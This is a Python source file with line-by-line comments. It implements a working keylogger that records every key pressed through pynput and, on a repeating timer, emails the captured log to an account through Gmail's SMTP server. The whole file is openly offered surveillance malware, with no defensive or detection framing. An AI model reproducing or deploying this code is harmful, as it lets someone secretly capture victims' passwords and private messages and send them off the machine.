import pynput.keyboard  
# Importing the pynput.keyboard module for capturing keyboard events
import threading  
# Importing the threading module for working with threads in Python
import smtplib  
# Importing the smtplib module for sending emails from Python

class Keylogger:  
    # Defining a new class named Keylogger
    def __init__(self, Timer, email, password) -> None:  
        # Constructor method for initializing class attributes
        self.Timer = Timer  
        # Assigning the Timer parameter to the Timer attribute
        self.email = email  
        # Assigning the email parameter to the email attribute
        self.password = password  
        # Assigning the password parameter to the password attribute
        self.log = ""  
        # Initializing the log attribute to an empty string
        
    def process_keys(self, key):  
        # Method for processing pressed keys
        try:  
            # Start of a try block to handle potential exceptions
            self.log += key.char  
            # Appending the character represented by the pressed key to the log attribute
        except AttributeError:  
            # Catching the AttributeError exception
            if key == key.space:  
                # Checking if the pressed key is the space key
                self.log += " "  
                # Appending a space character to the log attribute
            else:  
                # Handling the case when the pressed key is not the space key
                self.log += " " + str(key) + " "  
                # Appending the pressed key (converted to a string) surrounded by spaces to the log attribute
                
    def send_mail(self, email, password, message):  
        # Method for sending emails
        server = smtplib.SMTP("smtp.gmail.com", 587)  
        # Creating an SMTP server object for Gmail
        server.starttls()  
        # Starting the TLS connection for secure communication with the SMTP server
        server.login(email, password)  
        # Logging in to the SMTP server using the provided email and password
        server.sendmail(email, email, message)  
        # Sending an email from the provided email address to the same email address with the specified message content
        server.quit()  
        # Closing the connection to the SMTP server
        
    def report(self):  
        # Method for reporting captured keystrokes
        self.send_mail(self.email, self.password, self.log)  
        # Calling the send_mail method to send the captured keystrokes via email
        print(self.log)  
        # Printing the captured keystrokes to the console
        self.log = ""  
        # Resetting the log attribute to an empty string after sending the email
        timer = threading.Timer(self.Timer, self.report)  
        # Creating a timer object that calls the report method after a specified time interval
        timer.start()  
        # Starting the timer
        
    def start(self):  
        # Method for starting the keylogging process
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_keys)  
        # Creating a keyboard listener object that calls the process_keys method whenever a key is pressed
        with keyboard_listener:  
            # Ensuring that the keyboard_listener object is properly cleaned up after its use
            self.report()  
            # Starting the reporting process, which sends emails containing the captured keystrokes at regular intervals
            keyboard_listener.join()  
            # Blocking the main thread until the keyboard listener is stopped
